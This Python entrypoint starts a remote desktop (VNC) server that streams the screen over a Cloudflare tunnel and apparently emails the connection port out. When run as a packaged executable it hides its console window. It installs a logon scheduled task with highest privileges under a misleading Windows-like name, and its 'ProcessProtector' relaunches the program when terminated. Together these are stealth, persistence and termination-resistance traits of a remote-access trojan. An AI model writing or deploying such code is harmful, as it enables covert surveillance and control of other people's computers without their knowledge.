"""Application entrypoint and startup orchestration."""
from __future__ import annotations

import atexit
import asyncio
import ctypes
import logging
import os
import platform
import signal
import subprocess
import sys
import threading
import time
from pathlib import Path

from .config import _load_dotenv
from .logging_utils import _setup_logging_to_file
from .network import get_local_ip


def configure_event_loop_policy():
    try:
        if sys.platform.startswith("win"):
            asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    except Exception:
        pass


def configure_stdout_encoding():
    try:
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass


def maybe_hide_console():
    try:
        if getattr(sys, "frozen", False) or os.environ.get("HIDE_CONSOLE") == "1":
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def configure_logging():
    _setup_logging_to_file()
    log_level_name = os.environ.get("ZADOO_LOG_LEVEL", "INFO").upper()
    log_level = getattr(logging, log_level_name, logging.INFO)
    try:
        logging.basicConfig(
            level=log_level,
            format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
            datefmt="%H:%M:%S",
        )
        logging.getLogger("asyncio").setLevel(logging.WARNING)
        logging.getLogger("websockets.server").setLevel(logging.WARNING)
        logging.getLogger("websockets").setLevel(logging.WARNING)
        try:
            logging.getLogger("comtypes").setLevel(logging.WARNING)
            logging.getLogger("comtypes.client").setLevel(logging.WARNING)
            logging.getLogger("comtypes.client._code_cache").setLevel(logging.WARNING)
            logging.getLogger("comtypes._post_coinit").setLevel(logging.WARNING)
        except Exception:
            pass
    except Exception:
        pass
    try:
        from logging.handlers import RotatingFileHandler

        file_handler = RotatingFileHandler(
            "vnc_debug.log",
            maxBytes=5_000_000,
            backupCount=2,
            encoding="utf-8",
        )
        file_handler.setLevel(log_level)
        file_handler.setFormatter(logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s"))
        root = logging.getLogger()
        if not any(isinstance(h, RotatingFileHandler) for h in root.handlers):
            root.addHandler(file_handler)
    except Exception:
        pass


def install_startup_task():
    task_name = "Windows Graphic Utility Startup"
    exe_path = sys.executable
    check_cmd = ["schtasks", "/query", "/tn", task_name]
    result = subprocess.run(check_cmd, capture_output=True, text=True)
    if result.returncode == 0:
        return
    create_cmd = [
        "schtasks",
        "/create",
        "/tn",
        task_name,
        "/tr",
        f'"{exe_path}"',
        "/sc",
        "onlogon",
        "/rl",
        "highest",
        "/f",
    ]
    try:
        subprocess.run(create_cmd, check=True, capture_output=True)
    except subprocess.CalledProcessError as exc:
        logging.warning("Startup task installation failed. Run as Administrator or set ZADOO_DISABLE_STARTUP_TASK=1.", exc_info=True)
        try:
            stderr = (exc.stderr or b"").decode("utf-8", "ignore") if isinstance(exc.stderr, (bytes, bytearray)) else str(exc.stderr or "")
            if stderr.strip():
                print(f"Startup task installation failed: {stderr.strip()}")
            else:
                print("Startup task installation failed. Run as Administrator or set ZADOO_DISABLE_STARTUP_TASK=1.")
        except Exception:
            pass


class ProcessProtector:
    def __init__(self):
        self.protected = True
        self.start_protection()

    def start_protection(self):
        atexit.register(self.cleanup)
        signal.signal(signal.SIGTERM, self.signal_handler)
        signal.signal(signal.SIGINT, self.signal_handler)
        self.monitor_thread = threading.Thread(target=self.monitor_processes, daemon=True)
        self.monitor_thread.start()

    def monitor_processes(self):
        while self.protected:
            try:
                time.sleep(30)
            except Exception:
                pass

    def restart_protection(self):
        try:
            if getattr(sys, "frozen", False):
                cmd = [sys.executable]
            else:
                script = Path(__file__).resolve().parent.parent / "zadoo_vnc_single.py"
                cmd = [sys.executable, str(script)] if script.exists() else [sys.executable, "-m", "zadoo_vnc.app"]
            subprocess.Popen(cmd, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        except Exception:
            pass

    def signal_handler(self, signum, frame):
        if signum == signal.SIGINT:
            self.cleanup()
            raise KeyboardInterrupt
        if self.protected:
            self.restart_protection()

    def cleanup(self):
        self.protected = False


def _parse_port(value, default=None):
    try:
        port = int(str(value).strip())
        if 1 <= port <= 65535:
            return port
    except Exception:
        pass
    return default


def choose_web_port(desired_web_port=6173):
    return _parse_port(os.environ.get("ZADOO_PORT"), desired_web_port)


def choose_secondary_port(primary_port):
    port = _parse_port(os.environ.get("ZADOO_SECONDARY_PORT"), None)
    if port == primary_port:
        print("Ignoring ZADOO_SECONDARY_PORT because it matches ZADOO_PORT")
        return None
    return port


def main():
    configure_event_loop_policy()
    configure_stdout_encoding()
    maybe_hide_console()
    _load_dotenv()
    configure_logging()

    disable_startup_task = os.environ.get("ZADOO_DISABLE_STARTUP_TASK", "").strip().lower() in {
        "1",
        "true",
        "yes",
        "on",
    }
    if getattr(sys, "frozen", False) and not disable_startup_task:
        install_startup_task()

    use_process_protector = os.environ.get("ZADOO_DISABLE_PROCESS_PROTECTOR", "").strip().lower() not in {
        "1",
        "true",
        "yes",
        "on",
    }
    protector = ProcessProtector() if use_process_protector else None
    _ = protector

    from .dependencies import HAS_MSS, HAS_PIL, HAS_PYAUTOGUI, WIN32_AVAILABLE
    from .screen_capture import ScreenCapturer
    from .server import VNCServer
    from .tunnel import CloudflareTunnelManager

    print("=" * 60)
    print("COMPLETE VNC WITH TUNNEL")
    print("=" * 60)

    if not (HAS_PYAUTOGUI and (HAS_MSS or WIN32_AVAILABLE or HAS_PIL)):
        print("Missing critical dependencies for screen capture or input control")
        sys.exit(1)

    print(f"\nSystem: {platform.system()} {platform.release()}")
    local_ip = get_local_ip()
    desired_web_port = choose_web_port(6173)
    secondary_port = choose_secondary_port(desired_web_port)
    print(f"Local network: http://{local_ip}:{desired_web_port}")
    print(f"Selected web server port: {desired_web_port}")
    if secondary_port:
        print(f"Selected secondary web server port: {secondary_port}")

    use_tunnel = os.environ.get("ZADOO_DISABLE_TUNNEL", "").strip().lower() not in {"1", "true", "yes", "on"}
    tunnel_manager = None
    if use_tunnel:
        print(f"Selected tunnel port (single): {desired_web_port}")
        tunnel_manager = CloudflareTunnelManager(primary_port=desired_web_port)
        print("Tunnel will start after the local server binds successfully.")

    print(f"\n{'=' * 60}")
    print("VNC SERVER STARTING...")
    print(f"Local: http://localhost:{desired_web_port}")
    print(f"Network: http://{local_ip}:{desired_web_port}")
    if use_tunnel and tunnel_manager:
        print("Internet: Check above for public URL")
    print("To stop: Press Ctrl+C")
    print("=" * 60)

    vnc_server = VNCServer(desired_web_port, secondary_port)
    vnc_server.enable_tunnel = use_tunnel
    try:
        if tunnel_manager:
            tunnel_manager.email_port = secondary_port or desired_web_port
            print(f"Email will include port: {tunnel_manager.email_port}")
    except Exception:
        pass
    if tunnel_manager:
        vnc_server.set_tunnel_manager(tunnel_manager)
        print("Tunnel will launch after the local server binds successfully...")

    capturer = ScreenCapturer(fps=vnc_server.current_fps, quality=vnc_server.current_quality)
    vnc_server.screen_capturer = capturer
    try:
        vnc_server._apply_stream_profile("startup")
    except Exception:
        vnc_server.screen_capturer.quality = vnc_server.current_quality
    capturer.start()

    try:
        asyncio.run(vnc_server.start_server())
    except OSError as e:
        err_no = getattr(e, "errno", None)
        if err_no == 10048:
            print(f"Bind failed: port {vnc_server.port} is already in use. Set ZADOO_PORT to another port.")
        else:
            raise
    except (KeyboardInterrupt, SystemExit):
        print("\nShutting down...")
    finally:
        capturer.stop()
        if vnc_server.tunnel_manager:
            vnc_server.tunnel_manager.cleanup()
    print("Goodbye!")


if __name__ == "__main__":
    main()
